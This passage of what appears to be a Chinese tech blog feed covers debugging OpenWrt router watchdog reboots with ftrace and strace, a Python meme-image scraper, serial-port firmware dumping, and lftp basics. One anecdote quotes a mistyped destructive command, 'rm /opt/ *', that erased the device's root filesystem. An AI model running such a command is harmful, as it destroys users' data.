title="修改dni_home config/defconfig-orbi"></a>修改dni_home config/defconfig-orbi</h3><pre><code class="txt">CONFIG_DGC_FW_KERNEL_SIZE=&quot;4456448&quot;CONFIG_DGC_FW_ROOTFS_SIZE=&quot;37486592&quot;CONFIG_DGC_FW_KERNEL_SIZE_CC=&quot;4456448&quot;CONFIG_DGC_FW_ROOTFS_SIZE_CC=&quot;37486592&quot;</code></pre><h3 id="修改kernel-patch"><a href="#修改kernel-patch" class="headerlink" title="修改kernel patch"></a>修改kernel patch</h3><p>patch: kernel/patches_dni/0012-fix-issue-after-disable-usb-rootfs-checksum-error.patch</p><pre><code class="patch">      &#123; 0x0a600000, 0x02800000, &quot;firmware&quot; &#125;, -    &#123; 0x0a600000, 0x003c0000, &quot;kernel&quot; &#125;, -    &#123; 0x0a9c0000, 0x02440000, &quot;rootfs&quot; &#125;,-+    &#123; 0x0a600000, 0x003c0000, &quot;kernel&quot; &#125;,-+    &#123; 0x0a9c0000, 0x02440000, &quot;rootfs&quot; &#125;,++    &#123; 0x0a600000, 0x00440000, &quot;kernel&quot; &#125;,++    &#123; 0x0aa40000, 0x023c0000, &quot;rootfs&quot; &#125;,      &#123; 0x0ce00000, 0x03200000, &quot;reserved&quot; &#125;,</code></pre><h2 id="watchdog相关指令"><a href="#watchdog相关指令" class="headerlink" title="watchdog相关指令"></a>watchdog相关指令</h2><h3 id="禁用watchdog的硬件重启功能"><a href="#禁用watchdog的硬件重启功能" class="headerlink" title="禁用watchdog的硬件重启功能"></a>禁用watchdog的硬件重启功能</h3><pre><code class="sh">devmem 0x0B017008 w 0x0</code></pre><p>说明：禁用watchdog的硬件重启功能可以防止kernel crash后自动重启，配合ftrace及其它调试信息能方便分析问题。</p><h3 id="watchdog软件控制指令"><a href="#watchdog软件控制指令" class="headerlink" title="watchdog软件控制指令"></a>watchdog软件控制指令</h3><pre><code class="sh"># To query watchdog statusubus call system watchdog# To stop watchdogubus call system watchdog &#39;&#123;&quot;stop&quot;: true&#125;&#39;# To start watchdogubus call system watchdog &#39;&#123;&quot;stop&quot;: false&#125;&#39;# To configure watchdog timeout as 20 seconds (default is 30 seconds)ubus call system watchdog &#39;&#123;&quot;timeout&quot;: 20&#125;&#39;</code></pre><p>说明：在没有禁用watchdog硬件功能时，如果使用<code>ubus</code>停止<code>watchdog</code>，系统会在设定的超时时间(默认30s)后自动重启。</p><h2 id="测试脚本"><a href="#测试脚本" class="headerlink" title="测试脚本"></a>测试脚本</h2><p>启用<code>ftrace</code>调试功能除了需要修改配置文件外，还要对<code>/sys/kernel/debug/tracing/</code>目录的文件进行相关修改才能生效。下面是在测试trial FW时用到的测试脚本，用于获取必要的调试信息。</p><pre><code class="sh">#!/bin/sh# use for watchdog cause reboot issue#********************************************## watchdog settings#********************************************## disable the APCS_KPSS watchdogdevmem 0x0B017008 w 0x0# check watchdog statusubus call system watchdog# other related commands#   ubus call system watchdog &#39;&#123;&quot;stop&quot;: true&#125;&#39;#   ubus call system watchdog &#39;&#123;&quot;stop&quot;: false&#125;&#39;#   ubus call system watchdog &#39;&#123;&quot;timeout&quot;: 20&#125;&#39;#********************************************## enable ftrace#********************************************## To enable function tracing during run timeecho 0 &gt; /sys/kernel/debug/tracing/tracing_onecho function &gt; /sys/kernel/debug/tracing/current_tracerecho 1 &gt; /sys/kernel/debug/tracing/tracing_on# To enable specific events to be tracedecho tlet_entry &gt;&gt; /sys/kernel/debug/tracing/set_eventecho tlet_exit &gt;&gt; /sys/kernel/debug/tracing/set_eventecho irq_handler_entry &gt;&gt; /sys/kernel/debug/tracing/set_eventecho irq_handler_exit &gt;&gt; /sys/kernel/debug/tracing/set_eventecho softirq_entry &gt;&gt; /sys/kernel/debug/tracing/set_eventecho softirq_exit &gt;&gt; /sys/kernel/debug/tracing/set_eventecho timer_expire_entry &gt;&gt; /sys/kernel/debug/tracing/set_eventecho timer_expire_exit &gt;&gt; /sys/kernel/debug/tracing/set_eventecho sched_switch &gt;&gt; /sys/kernel/debug/tracing/set_event# To Dump the FTrace to the console in case of oopsecho 1 &gt; /proc/sys/kernel/ftrace_dump_on_oops# To increase the size of Ftrace buffer per CPUecho 2048 &gt; /sys/kernel/debug/tracing/buffer_size_kb# To enable tracing of signalsecho SyS_reboot:dump &gt; /sys/kernel/debug/tracing/set_ftrace_filterecho 1 &gt; /sys/kernel/debug/tracing/events/signal/enableecho 1 &gt; /sys/kernel/debug/tracing/tracing_onsysctl -w kernel.ftrace_dump_on_oops=1#********************************************## loop to cat memory info and process info#********************************************#while truedo    free    ps ww    cat /proc/meminfo    cat /proc/slabinfo    ubus call system watchdog    sleep 300done</code></pre><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li><a href="https://www.kernel.org/doc/Documentation/trace/ftrace.txt">ftrace - Function Tracer</a></li></ul><h2 id="2020-01-14-更新"><a href="#2020-01-14-更新" class="headerlink" title="2020.01.14 更新"></a>2020.01.14 更新</h2><p>在一个新项目中又出现了watchdog bite导致系统重启的问题，而且重现概率很高，所以又开始了新一轮的debug</p><h3 id="重现步骤"><a href="#重现步骤" class="headerlink" title="重现步骤"></a>重现步骤</h3><p>根据SQA提供的重现步骤，经过多次测试后简化如下，按此步骤可以100%重现问题</p><ol><li>重置路由器</li><li>重新配置路由器</li><li>使能block site功能，添加关键词，比如yam</li><li>使能Email功能，添加gmail邮箱，当用户访问blocked site时自动发送mail</li><li>访问block site</li></ol><p>除了第一次重现时需要执行<code>step1~4</code>外，之后重新烧录FW都只需执行第5步</p><h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><h4 id="enable-lockup"><a href="#enable-lockup" class="headerlink" title="enable lockup"></a>enable lockup</h4><p>在情况并不明朗的情况下，仅仅根据以下两行log根本无法判断问题所在</p><pre><code class="log">Causing a watchdog bite!Configuring Watchdog Timer</code></pre><p>所以先假设可能是某些进程死锁导致的，启用内核的<code>lockup debugging</code>功能，启用方式与上述一致</p><p>启用后，除了boot阶段打印了大量log外，watchdog问题出现时并无任何lockup log出现，所以进入下一步</p><h4 id="print-watchdog-ping-log"><a href="#print-watchdog-ping-log" class="headerlink" title="print watchdog ping log"></a>print watchdog ping log</h4><p>watchdog的工作流程大致是：procd定时发送一个ping包给内核，内核的watchdog驱动接收到ping后喂给硬件watchdog</p><p>为了确认是user space的问题还是kernel space的问题，我们需要print两个space的ping信息，相关patch也和上述的一致，只不过在procd中需要另外添加一个patch</p><pre><code class="patch">+--- procd.old/watchdog.c    2020-01-13 16:03:08.671893208 +0800++++ procd/watchdog.c    2020-01-13 16:06:32.966771640 +0800+@@ -32,9 +33,26 @@+ static int wdt_fd = -1;+ static int wdt_frequency = 5;+++void __nprintf(const char *fmt, ...);++/* use this &#39;__nprintf&#39; to print message */++void __nprintf(const char *fmt, ...)++&#123;++    va_list ap;++    static FILE *filp;++++    if ((filp == NULL) &amp;&amp; (filp = fopen(&quot;/dev/console&quot;, &quot;a&quot;)) == NULL)++            return;++++    va_start(ap, fmt);++    vfprintf(filp, fmt, ap);++    fputs(&quot;\n&quot;, filp);++    va_end(ap);++&#125;+++ void watchdog_ping(void)+ &#123;+     DEBUG(4, &quot;Ping\n&quot;);++    __nprintf(&quot;[%s:%d] Ping\n&quot;, __func__, __LINE__);+     if (wdt_fd &gt;= 0 &amp;&amp; write(wdt_fd, &quot;X&quot;, 1) &lt; 0)+         ERROR(&quot;WDT failed to write: %s\n&quot;, strerror(errno));+ &#125;</code></pre><p>再次重现可以看到以下console log</p><pre><code class="log">124809:[Mon Jan 13 18:12:48.754 2020] [watchdog_ping:54] Ping124810:[Mon Jan 13 18:12:48.754 2020] *************qcom-wdt-ping1*******************124811:[Mon Jan 13 18:12:48.754 2020] **************qcom-wdt-ping2*******************124814:[Mon Jan 13 18:12:52.811 2020] [watchdog_ping:54] Ping124815:[Mon Jan 13 18:12:53.766 2020] *************qcom-wdt-ping1*******************124816:[Mon Jan 13 18:12:53.766 2020] **************qcom-wdt-ping2*******************124820:[Mon Jan 13 18:12:55.021 2020] cat: can&#39;t open &#39;/tmp/gl_task_name&#39;: No such file or directory124821:[Mon Jan 13 18:12:55.021 2020] cat: can&#39;t open &#39;/var/log/block-site-messages&#39;: No such file or directory124880:[Mon Jan 13 18:13:53.391 2020] Causing a watchdog bite!</code></pre><p>可以看出，在刷新block site页面后，console不再打印watchdog log，可以判断是user space出了问题，也就是<code>procd</code>。</p><p>在刷新block site页面时，内核模块会发送信号告知<code>procd</code>（这个是组长告知的，重要信息！），结合log中显示的两个不存在的文件，可以找到相应的执行脚本<code>send_email_alert</code>。procd在接收信号后会通过<code>system</code>函数调用脚本，进而通过ssmtp发送邮件。</p><p>此时为了确定脚本执行过程中发生了什么异常，我加了许多log，然后定位到<code>ssmtp</code>执行时间过长，为此，到了接下来的最后一步。</p><h4 id="strace-ssmtp"><a href="#strace-ssmtp" class="headerlink" title="strace ssmtp"></a>strace ssmtp</h4><p>修改脚本<code>send_email_alert</code>，在执行ssmtp前添加<code>strace</code>，追踪代码执行过程。</p><pre><code class="log">[Tue Jan 14 16:08:44.046 2020] socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 5[Tue Jan 14 16:08:44.046 2020] connect(5, &#123;sa_family=AF_INET, sin_port=htons(25), sin_addr=inet_addr(&quot;139.175.54.240&quot;)&#125;, 16</code></pre><p>可以发现进程卡死在connect部分，最终分析出访问gmail时连接超时，导致procd hang住，无法正常发送watchdog ping，进而引发reboot。</p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>在启用block site功能和send_email_alert功能后，访问一个被路由器block的网站，此时内核模块会向procd进程发送一个信号，procd接收信号后会后通过<code>system</code>函数执行一个发送邮件的指令，但是当发送的对象是gmail时，由于中国网络无法直接访问google，导致长时间无法连接，最终导致procd hang住，并且无法发送watchdog ping，最终导致watchdog等待超时进而重启设备。</p><p>简言之：<strong>邮件发送超时导致procd hang住</strong></p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>最简单的方法是，在调用<code>system</code>函数时，让指令在后台执行↓</p><pre><code class="patch">-   system(&quot;/etc/email/send_email_alert&quot;);+   system(&quot;/etc/email/send_email_alert &amp;&quot;);</code></pre><p>当然，或许有其它更好的解决方案，比如不要让内核模块直接发信号给procd，毕竟procd作为pid为1的特殊进程，不适合处理太多琐碎的事务。可以让内核模块给email相关的daemon进程单独发信号，但改动会多很多。就目前而言，使用后台执行指令的方法是简单而有效的。</p><p>OK，这个问题总算完结了，撒花✿✿ヽ(°▽°)ノ✿~</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>watchdog是用来监控系统异常的，当其重启设备时，绝大情况源于进程死锁</li><li>对于watchdog相关问题，可以先确认是用户空间的问题还是内核空间的问题，便于针对性debug</li><li>有时候，某些看起来与问题毫无关联的log可能就是最关键的突破点</li><li>重现步骤的准确性能大大提高问题调试的效率</li></ol>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openwrt </tag>
            
            <tag> ftrace </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python网络爬虫7 - 爬取表情包</title>
      <link href="2019/10/09/fabiaoqing/"/>
      <url>2019/10/09/fabiaoqing/</url>
      
        <content type="html"><![CDATA[<p>为了逗女朋友开心，想找一堆表情包，那么作为一名程序员，自然是会想到用程序来完成这个事情，而Python爬虫就是一个非常好的方法。</p><p>我先找到了一个专门发布表情包的网站，就叫做<a href="https://www.fabiaoqing.com/">发表情</a>网，可以通过搜索关键词得到大量相关的表情包，下面对这个网站的爬取进行详细介绍。</p><p><img src="/assets/emotion/fabiaoqing.png" alt="fabiaoqing"></p><h2 id="分析站点"><a href="#分析站点" class="headerlink" title="分析站点"></a>分析站点</h2><p>为了不引起不适，我选择搜索“你好”，出来的结果是这样的</p><p><img src="/assets/emotion/hello.png" alt="hello"></p><p>可以看到共有<code>688</code>个相关的<strong>表情</strong>，右侧的<strong>表情包</strong>是分组形式的，不是我的爬取对象。我们只关注表情，在网页底部可以看到分页信息：</p><p><img src="/assets/emotion/page.png" alt="page"></p><p>切换分页到第４页后，可以看到网址的编号情况如下：</p><p><img src="/assets/emotion/hello-2.png" alt="hello page 2"></p><p>网址是<a href="https://www.fabiaoqing.com/search/search/keyword/%E4%BD%A0%E5%A5%BD/type/bq/page/4.html">https://www.fabiaoqing.com/search/search/keyword/你好/type/bq/page/4.html</a>，据此就可以分析出表情的分页格式</p><ol><li><code>keyword</code> 后接关键词，此处为“你好”</li><li><code>type</code> 后接类型，此处为&quot;bq&quot;,对应<strong>表情</strong></li><li><code>page</code> 后接页码，此处为&quot;4.html&quot;，对应第４页</li></ol><p>到此就确定了关键词和分页信息的整合方式，根据这个可以按顺序获取指定关键词的所有分页。那么接下来的问题是如何解析每个分页中的图片信息，下面请看：</p><p><img src="/assets/emotion/hello-3.png" alt="hello page 3"></p><p>每个图片都在一个<code>div</code>标签内，使用<code>chrome</code>的调试工具可以获取到图片元素的<code>xpath</code>路径，然后稍作修改就可以匹配到当前页的所有图片</p><pre><code class="python">imgs = page.xpath(&#39;//div[@class=&quot;searchbqppdiv tagbqppdiv&quot;]//img/@data-original&#39;)</code></pre><p>好了，到此，网站的分页已经每页的图片获取方式都知道了，下面开始完成代码的编写↓</p><h2 id="爬虫的代码实现"><a href="#爬虫的代码实现" class="headerlink" title="爬虫的代码实现"></a>爬虫的代码实现</h2><ol><li>获取指定关键词的所有分页</li><li>从分页中获取所有表情图片的链接</li><li>下载图片并存储到本地</li></ol><h3 id="get-imgs"><a href="#get-imgs" class="headerlink" title="get_imgs"></a>get_imgs</h3><p>首先对单个关键词，实现分页和图片链接的获取</p><pre><code class="python">def get_imgs(keyword):    &#39;&#39;&#39;爬取某一个关键词相关的所有表情包    Args:        keyword: 表情包关键词    &#39;&#39;&#39;    page_index = 0    img_cnts = 0    save_dir = get_path(keyword)    while True:        page_index = page_index + 1        # https://fabiaoqing.com/search/search/keyword/抱抱/type/bq/page/1.html        url = &#39;&#123;&#125;&#123;&#125;/type/bq/page/&#123;&#125;.html&#39;.format(base_url, keyword, page_index)        response = requests.get(url, headers=headers).content        page = html.fromstring(response)        imgs = page.xpath(            &#39;//div[@class=&quot;searchbqppdiv tagbqppdiv&quot;]//img/@data-original&#39;)        print(&#39;爬取 &quot;&#123;&#125;&quot; 相关表情包第 &#123;&#125; 页:&#39;.format(keyword, page_index))        img_cnts = download_imgs(imgs, img_cnts, save_dir)        if page_index == 1:            page_num = int(                page.xpath(&#39;//*[@id=&quot;mobilepage&quot;]/text()&#39;)[0].split()[-1])        if page_index == page_num:            break    return img_cnts, save_dir</code></pre><p>思路很简单，就是从１不断增加分页页码<code>page_index</code>，然后使用<code>lxml</code>中的<code>xpath</code>解析网页得到图片链接，最后使用下面介绍的<code>download_imgs</code>函数下载图片。那么什么时候停止获取呢？就是比较首页获取的总分页数<code>page_num</code>和当前分页数<code>page_index</code>是否一致，如果一致说明已经到最后一页。</p><p>函数中的<code>get_path</code>是个获取本地存储链接的函数，<code>base_url</code>和<code>headers</code>是两个全局变量</p><pre><code class="python">base_url = &#39;https://fabiaoqing.com/search/search/keyword/&#39;headers = &#123;    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36&#39;&#125;def get_path(keyword):    &#39;&#39;&#39;生成指定关键词对应的表情包存储路径&#39;&#39;&#39;    home_path = os.path.expanduser(&#39;~&#39;)    path = os.path.join(home_path, &#39;Pictures/python/表情包/&#39; + keyword)    if not os.path.isdir(path):        os.makedirs(path)    return os.path.realpath(path)</code></pre><h3 id="download-imgs"><a href="#download-imgs" class="headerlink" title="download_imgs"></a>download_imgs</h3><pre><code class="python">def download_imgs(img_urls, starti, save_dir):    &#39;&#39;&#39;下载单个页面内所有图片    Args:        img_urls: 关键词相关表情包某一分页的所有图片链接        starti: 当前页面首个图片命名id        save_dir: 图片存储路径    &#39;&#39;&#39;    fid = starti    for img in img_urls:        print(&#39;\t&#39; + img)        fid = fid + 1        file_name = &#39;&#123;&#125;.&#123;&#125;&#39;.format(fid, os.path.basename(img).split(&#39;.&#39;)[-1])        save_path = os.path.join(save_dir, file_name)        try:            with open(save_path, &#39;wb&#39;) as f:                f.write(requests.get(img, headers=headers, timeout=20).content)        except requests.exceptions.ConnectionError as ce:            print(ce.strerror())        except requests.exceptions.MissingSchema:            print(img + &#39; missing schema&#39;)        except requests.exceptions.ReadTimeout:            print(&#39;get &#123;&#125; timeout, skip this item.&#39;.format(img))        finally:            pass    return fid</code></pre><p>别看代码这么长，下载图片的关键就两行，和以往下载图片的方式大同小异，不再赘述。</p><pre><code class="python">with open(save_path, &#39;wb&#39;) as f:    f.write(requests.get(img, headers=headers, timeout=20).content)</code></pre><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>主函数也比较简单，从命令行参数中获取所有关键词，逐个对关键词进行对应的表情爬取并统计爬取到的表情数。</p><pre><code class="python">def main():    if len(sys.argv) &lt; 2:        usage()        sys.exit(0)    print(&#39;============================================&#39;)    for keyword in sys.argv[1:]:        print(&#39;开始爬取关键词为 &quot;&#123;&#125;&quot; 的表情包:&#39;.format(keyword))        count, save_dir = get_imgs(keyword)        print(&#39;共爬取 &quot;&#123;&#125;&quot; 表情包 &#123;&#125; 个&#39;.format(keyword, count))        print(&#39;文件存储于&quot;&#123;&#125;&quot;&#39;.format(save_dir))    print(&#39;\n爬取完成！&#39;)    print(&#39;============================================&#39;)</code></pre><p>由于我们的目的是根据输入的关键词参数获取相关的表情，代码完成后的使用方式是这样的：</p><pre><code class="bash">python fabiaoqing_spider.py keyword1 keyword2 ...</code></pre><p>所以<code>usage</code>函数是这样的，可以同时爬取多个关键词</p><pre><code class="python">def usage():    print(&#39;Usage:\n\t&#39; + os.path.basename(sys.argv[0]) +          &#39; [key1] [key2] [key3] ...\n&#39;)</code></pre><h2 id="爬取测试"><a href="#爬取测试" class="headerlink" title="爬取测试"></a>爬取测试</h2><pre><code class="bash">python fabiaoqing_spider.py 你好 抱抱 亲亲</code></pre><p><img src="/assets/emotion/test1.png" alt="test1"></p><p><img src="/assets/emotion/test2.png" alt="test2"></p><p><img src="/assets/emotion/test3.png" alt="test3"></p><p>上面是截取的部分爬取过程，下面是<strong>亲亲</strong>表情包的爬取结果</p><p><img src="/assets/emotion/test4.png" alt="test4"></p><p>代码已托管至<a href="https://github.com/Litreily/capturer">Github capturer</a>项目，欢迎交流。</p><p>好啦，最后祝大家撩妹成功！</p>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spider </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>嵌入式设备在无法使用网络和USB的情况下如何进行文件传输</title>
      <link href="2019/09/12/minicom/"/>
      <url>2019/09/12/minicom/</url>
      
        <content type="html"><![CDATA[<h2 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h2><p>ST 测试时出现一个问题，路由器（采用<a href="https://openwrt.org/">Openwrt</a>系统）的console无法正常显示shell提示符，正常情况下是</p><pre><code class="bash">root@DeviceName:/#</code></pre><p>这样的，出问题时是下面这样的，用户名不见了，设备名变成了none.</p><pre><code class="bash">@(none):/#</code></pre><span id="more"></span><p>不仅如此，执行ls发现根目录很多文件都不存在了。最初我和组长认为可能是存储固件的<code>nand flash</code>出了问题，所以想把固件<code>dump</code>出来换到另一块板子上，所以先使用<code>nanddump</code>指令把固件保存到<code>fw.img</code>文件中：</p><pre><code class="bash">nanddump /dev/mtd8 -f /tmp/fw.img</code></pre><p>接着想要通过<code>tftp</code>传到外面，但是失败了，<code>ifconfig</code>查看网络信息发现没有任何IP，<code>ps</code>查看进程信息发现绝大部分进程都没有启动，很显然，缺失的文件过多，板子无法正常使用网络传输了。那么USB呢，对了我用的这款路由器带有USB功能，插上以后没有任何反应，不过也是意料之中，相关的USB检测进程木有起来呗。</p><p>那么现在问题来了，在无法使用网络和USB的情况下，如何把数据从板子copy到PC呢？下面介绍两种方法。</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><h3 id="uboot-tftp文件传输"><a href="#uboot-tftp文件传输" class="headerlink" title="uboot tftp文件传输"></a>uboot tftp文件传输</h3><p>我最初想到的方法就是uboot，通过uboot把数据dump到内存，然后使用uboot中的tftp把数据传出来，相关指令如下：</p><pre><code class="bash">nand read &lt;ram_addr&gt; &lt;flash_addr&gt; &lt;size&gt;tftpput &lt;ram_addr&gt; &lt;size&gt; &lt;file_name&gt;# examplenand read 0x84000000 0x1480000 0x1860000tftpput 0x84000000 0x1860000 Fireware.img</code></pre><p>这里涉及到两个指令<code>nand read</code>和<code>tftpput</code>，<code>nand flash</code>的block size是128K，所以flash地址以及size都设置为128K的整数倍</p><ul><li><code>ram_addr</code> - 内存地址，也是平常fw_recovery存放固件的地址</li><li><code>flash_addr</code> - 存放固件的flash地址，需要查看代码相关配置文件查询</li><li><code>size</code> - 读取数据的长度，大概设置为大于固件大小的值</li></ul><p>在uboot启动时会将自身IP设为<code>192.168.1.1</code>，所以只需把PC端的IP设为静态IP <code>192.168.1.10</code>即可传输。然而还有一个问题，出现问题的设备uboot并不包含<code>tftpput</code>指令，这是<code>uboot</code>版本问题，这就尴尬了。。。显然此路不通。</p><h3 id="串口传输"><a href="#串口传输" class="headerlink" title="串口传输"></a>串口传输</h3><p>重点来了，在我黔驴技穷的情况下，我组长很平静的说出了<strong>串口传输</strong>的方法，绝对的骚操作!!!</p><p>乍一听，<strong>串口传输</strong>可能会觉得很一般，不就是通过串口把数据传出来么，当年单片机开发用的可溜了好吧。咱不急，慢慢看</p><p>这个方法在<code>linux</code>系统很方便，<code>windows</code>系统没研究过。我使用的是<code>ubuntu 18.04</code>， 进入正题，使用<code>tmux</code>打开两个窗口，如果没有<code>tmux</code>或者<code>screen</code>则打开两个终端窗口也是一样的。</p><ul><li>发送窗口</li></ul><p>在super模式下，将文件<code>fw.img</code>通过串口打印出来</p><pre><code class="bash">litreily@litreily-Aspire-4750:~ &gt;&gt; sudo suroot# cat &gt; /dev/ttyUSB0cat fw.img</code></pre><p>这个窗口通过cat指令向串口发送指令<code>cat fw.img</code>,那么板子中的文件<code>fw.img</code>数据就会开始传输。</p><ul><li>接收窗口</li></ul><pre><code class="bash">sudo cat /dev/ttyUSB0 &gt; ~/fw.img</code></pre><p><img src="/assets/shell/serial_transfer.png" alt="serial transfer"></p><p>接收窗口通过cat串口接收输入数据并重定向至本地文件<code>～/fw.img</code>。注意，执行接收窗口的指令，再执行发送窗口的指令，这样就保证了接收数据的完整性。</p><p>是不是很骚气，这也充分展示了<code>linux</code>系统下<strong>一切皆是文件</strong>的厉害之处，通过简单的<code>cat</code>指令就可以玩转串口数据。</p><h3 id="扩展补充：minicom"><a href="#扩展补充：minicom" class="headerlink" title="扩展补充：minicom"></a>扩展补充：minicom</h3><p>针对串口传输，推荐个<code>linux</code>上极为好用的串口终端<code>minicom</code>，类似于<code>windows</code>系统中的<code>tera term</code>。</p><pre><code class="bash">sudo apt install minicom</code></pre><p>安装后，在串口连接状态下，通过以下指令找到串口设备<code>/dev/ttyUSB0</code></p><pre><code class="bash">$ ls -l /dev/ttyUSB*crw-rw---- 1 root dialout 188, 0 9月  12 22:42 /dev/ttyUSB0</code></pre><p>然后启动<code>minicom</code>，首次启动需要配置些参数</p><pre><code class="bash">sudo minicom -s+-----[configuration]------+| Filenames and paths      || File transfer protocols  || Serial port setup        || Modem and dialing        || Screen and keyboard      || Save setup as dfl        || Save setup as..          || Exit                     || Exit from Minicom        |+--------------------------+</code></pre><p>选择<code>Serial port setup</code>，然后根据下面的提示设置<code>Serial Device</code>为上面查找到的<code>/dev/ttyUSB0</code>，将Hardware Flow Control设置为no</p><pre><code class="bash">+-----------------------------------------------------------------------+| A -    Serial Device      : /dev/ttyUSB0                              || B - Lockfile Location     : /var/lock                                 || C -   Callin Program      :                                           || D -  Callout Program      :                                           || E -    Bps/Par/Bits       : 115200 8N1                                || F - Hardware Flow Control : No                                        || G - Software Flow Control : No                                        ||                                                                       ||    Change which setting?                                              |+-----------------------------------------------------------------------+</code></pre><p>选好后回车，在返回菜单中选择<code>Save setup as dfl</code>，下次直接通过<code>sudo minicom</code>就可以使用了。 退出<code>minicom</code>使用快捷键<code>Ctrl A Z</code>然后按<code>x</code>即可。</p><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>最终发现不是固件的问题，而是测试人员操作失误，将<code>rm /opt/*</code> 写成了<code>rm /opt/ *</code>，没错就是多了个空格，把根目录能删的都删了，至于怎么发现的，根据测试提供的<code>console log</code>。。。</p><p>虽然这个传输后的<code>fw.img</code>没有派上用场，但学到了一个可以特定情况下很有用的冷知识也是很不错的，关键时候挺管用的。不过这个方法也有其局限性，就是如果在cat过程中，板子自动打印了许多其它类型的<code>log</code>，就会把数据搞乱。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
            <tag> tftp </tag>
            
            <tag> nand </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用正则模糊匹配的ftp文件传输</title>
      <link href="2019/09/02/lftp/"/>
      <url>2019/09/02/lftp/</url>
      
        <content type="html"><![CDATA[<p>通常而言，FTP传输过程中，客户端在完成账户认证后，需要指定具体的文件路径方能下载或删除服务器端的文件。但是在使用命令行指令去操作ftp数据时，如果每次都要输入完整的路径就太麻烦了，而且如果想要同时下载多个文件还需逐个执行下载指令，那有什么方法可以通过<strong>正则表达式</strong>去完成模糊匹配和批量下载呢？本文就来介绍一下FTP数据传输的常用操作及正则匹配的实现方法。</p><p><img src="/assets/ftp/ftp.png" alt="ftp diagram"></p><span id="more"></span><h2 id="常用的ftp客户端"><a href="#常用的ftp客户端" class="headerlink" title="常用的ftp客户端"></a>常用的ftp客户端</h2><p>在介绍ftp数据传输之前，简单介绍下常用的几款ftp client：</p><ul><li><code>ftp</code></li><li><code>lftp</code>（支持ftp, http, https, sftp, fish, torrent, fxp, ...）</li><li><code>sftp</code>(Secure File Transfer Protocol)</li><li>FileZilla(图形化软件，支持ftp, ftps, sftp)</li></ul><p><code>ftp</code>是最基本的ftp客户端，高效但不安全，数据传输过程中使用明文，容易被截获和篡改。<code>lftp</code>是非常强大的一款文件传输工具，支持多种文件传输协议，功能强大，支持递归镜像整个目录及断点续传等，也是本文采用的ftp客户端。<code>sftp</code>是<code>ssh</code>的一部分，支持加密传输，与<code>ftp</code>语法基本一致，非常安全但是传输效率较低。最后的<code>FileZilla</code>是一款图形化软件，在windows操作系统中使用较多。</p><h2 id="ftp常用操作"><a href="#ftp常用操作" class="headerlink" title="ftp常用操作"></a>ftp常用操作</h2><p>本文主要介绍以下四个常用的ftp操作</p><ul><li>账户认证</li><li>文件上传</li><li>文件下载（用到正则模糊匹配）</li><li>文件删除</li></ul><p><code>lftp</code>指令的语法如下：</p><pre><code class="bash">lftp [-d] [-e cmd] [-p port] [-u user[,pass]] [site]lftp -f script_filelftp -c commandslftp --versionlftp --help</code></pre><p><code>lftp</code>的帮助信息中可以看到所有可以执行的指令。</p><pre><code class="bash">$ lftp -u &quot;username,password&quot; ftp://host.iplftp username@host:~&gt; help    !&lt;shell-command&gt;                     (commands)    alias [&lt;name&gt; [&lt;value&gt;]]             attach [PID]    bookmark [SUBCMD]                    cache [SUBCMD]    cat [-b] &lt;files&gt;                     cd &lt;rdir&gt;    chmod [OPTS] mode file...            close [-a]    [re]cls [opts] [path/][pattern]      debug [OPTS] [&lt;level&gt;|off]    du [options] &lt;dirs&gt;                  edit [OPTS] &lt;file&gt;    exit [&lt;code&gt;|bg]                     get [OPTS] &lt;rfile&gt; [-o &lt;lfile&gt;]    glob [OPTS] &lt;cmd&gt; &lt;args&gt;             help [&lt;cmd&gt;]    history -w file|-r file|-c|-l [cnt]  jobs [-v] [&lt;job_no...&gt;]    kill all|&lt;job_no&gt;                    lcd &lt;ldir&gt;    lftp [OPTS] &lt;site&gt;                   ln [-s] &lt;file1&gt; &lt;file2&gt;    ls [&lt;args&gt;]                          mget [OPTS] &lt;files&gt;    mirror [OPTS] [remote [local]]       mkdir [OPTS] &lt;dirs&gt;    module name [args]                   more &lt;files&gt;    mput [OPTS] &lt;files&gt;                  mrm &lt;files&gt;    mv &lt;file1&gt; &lt;file2&gt;                   mmv [OPTS] &lt;files&gt; &lt;target-dir&gt;    [re]nlist [&lt;args&gt;]                   open [OPTS] &lt;site&gt;    pget [OPTS] &lt;rfile&gt; [-o &lt;lfile&gt;]     put [OPTS] &lt;lfile&gt; [-o &lt;rfile&gt;]    pwd [-p]                             queue [OPTS] [&lt;cmd&gt;]    quote &lt;cmd&gt;                          repeat [OPTS] [delay] [command]    rm [-r] [-f] &lt;files&gt;                 rmdir [-f] &lt;dirs&gt;    scache [&lt;session_no&gt;]                set [OPT] [&lt;var&gt; [&lt;val&gt;]]    site &lt;site-cmd&gt;                      source &lt;file&gt;    torrent [OPTS] &lt;file|URL&gt;...         user &lt;user|URL&gt; [&lt;pass&gt;]    wait [&lt;jobno&gt;]                       zcat &lt;files&gt;    zmore &lt;files&gt;lftp username@host:~&gt;</code></pre><h2 id="账户认证"><a href="#账户认证" class="headerlink" title="账户认证"></a>账户认证</h2><p>基于安全考虑，绝大多数的ftp 